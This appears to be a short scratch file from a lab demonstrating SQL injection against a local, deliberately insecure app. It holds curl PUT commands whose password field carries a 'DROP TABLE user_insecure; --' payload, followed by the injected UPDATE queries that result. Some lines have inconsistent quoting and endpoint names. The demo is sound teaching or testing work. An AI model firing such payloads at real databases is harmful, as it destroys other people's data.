# Using curl to demonstrate SQL injection with a PUT request

curl -X PUT -H "Content-Type: application/json" -d '{"username": "attacker", "password": "\'; DROP TABLE user_insecure; --"}' http://127.0.0.1:5002/insecure_users/1

# Using curl to demonstrate SQL injection with a PUT request

curl -X PUT -H "Content-Type: application/json" -d "{\"username\": \"attacker\", \"password\": \"; DROP TABLE user_insecure; --\"}" http://127.0.0.1:5002/insecure_users/1

curl -X PUT -H "Content-Type: application/json" -d '{"username": "attacker", "password": "\"; DROP TABLE user_insecure; --"}' http://127.0.0.1:5002/insecure_user/1

UPDATE user_insecure SET username='attacker', password='"; DROP TABLE user_insecure; --' WHERE id = 2;

UPDATE user_insecure SET username='attacker', password=''; DROP TABLE user_insecure; --' WHERE id = 1;
